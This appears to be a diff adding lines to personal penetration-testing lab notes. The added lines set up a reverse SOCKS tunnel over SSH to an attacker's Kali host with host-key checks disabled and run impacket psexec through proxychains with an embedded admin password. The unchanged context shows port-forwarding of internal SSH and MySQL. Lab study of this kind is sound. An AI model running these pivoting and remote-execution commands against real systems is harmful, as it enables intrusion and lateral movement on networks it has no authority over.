@@ -173,6 +173,10 @@ chmpd +x portscan.sh
 
  ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@192.168.119.175
 
+ssh-keygen -t rsa -N ‘’ -f ~/.ssh/key
+ssh -f -N -R 1080 -o “UserKnownHostsFile=/dev/null” -o “StrictHostKeyChecking=no” -I key kali@192.168.119.164
+
+
 mkdir keys
 
 cd keys
@@ -594,5 +598,8 @@ shell
 whoami
 
 sessions -k 1 -  kill a session
+
+
+proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py admin:UWyBGeTp3Bhw7f@10.5.5.30
 
 
